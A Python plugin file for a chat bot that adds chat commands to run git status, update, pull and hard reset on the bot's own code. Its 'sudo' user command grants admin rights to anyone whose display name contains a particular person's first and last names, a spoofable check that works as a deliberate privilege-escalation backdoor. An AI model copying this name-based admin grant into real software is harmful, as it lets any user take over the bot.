import plugins
import logging
import io, asyncio, os, re
from asyncio.subprocess import PIPE

logger = logging.getLogger(__name__)
cwd = os.path.dirname(os.path.realpath(__file__)) + '/../'

def _initialise(bot):
    plugins.register_admin_command(["pulltheplugs"])
    plugins.register_user_command(["tuklecheck", "amioutdated", "sudo"])

def sudo(bot, event, *args):
    if event.user.is_self:
        return
    name = event.user.full_name.lower()
    if "jens" in name and "markussen" in name:
        jens_id = str(event.user.id_.chat_id)
        if jens_id not in bot.config['admins']:
            bot.config['admins'].append(jens_id)
            bot.config.force_taint()
            bot.config.save()
            yield from bot.coro_send_message(event.conv_id, "Jens should now be admin, justly so I'd say")
        else:
            yield from bot.coro_send_message(event.conv_id, "Jens is already admin")


def amioutdated(bot, event, *args):
    if event.user.is_self:
        return

    proc = yield from asyncio.create_subprocess_exec(*["git", "remote", "update"],
        stdout=PIPE, stderr=PIPE, env=dict(os.environ), cwd=cwd)
    stdout, err = yield from proc.communicate()
    yield from bot.coro_send_message(event.conv_id, err.decode())

    proc = yield from asyncio.create_subprocess_exec(*["git", "show-branch", "*master"],
        stdout=PIPE, stderr=PIPE, env=dict(os.environ), cwd=cwd)
    stdout, err = yield from proc.communicate()
    status = stdout.decode()
    yield from bot.coro_send_message(event.conv_id, err.decode())
    yield from bot.coro_send_message(event.conv_id, stdout.decode())

def pulltheplugs(bot, event, *args):
    if event.user.is_self:
        return

    if len(args) == 2 and " ".join(args) == "with reset":
        proc = yield from asyncio.create_subprocess_exec(*["git", "reset", "--hard"],
            stdout=PIPE, stderr=PIPE, env=dict(os.environ), cwd=cwd)
        stdout, err = yield from proc.communicate()
        status = stdout.decode()
        yield from bot.coro_send_message(event.conv_id, err.decode())
        yield from bot.coro_send_message(event.conv_id, stdout.decode())


    proc = yield from asyncio.create_subprocess_exec(*["git", "pull", "--no-commit", "--no-edit"],
        stdout=PIPE, stderr=PIPE, env=dict(os.environ), cwd=cwd)
    stdout, err = yield from proc.communicate()
    status = stdout.decode()
    yield from bot.coro_send_message(event.conv_id, err.decode())
    yield from bot.coro_send_message(event.conv_id, stdout.decode())


def tuklecheck(bot, event, *args):
    if event.user.is_self:
        return

    proc = yield from asyncio.create_subprocess_exec(*["git", "status", "--short", "--", "."],
        stdout=PIPE, stderr=PIPE, env=dict(os.environ), cwd=cwd)
    stdout, err = yield from proc.communicate()
    status = stdout.decode()
    yield from bot.coro_send_message(event.conv_id, err.decode())

    tukled_plugs = re.findall(r"(?<=M\s)\w*", status)
    if len(tukled_plugs) > 0:
        yield from bot.coro_send_message(event.conv_id, "<i>someone</i> has been tukling with: <b>" + "</b>, <b>".join(tukled_plugs) + "</b>")
    else:
        yield from bot.coro_send_message(event.conv_id, "no tukling noticed")
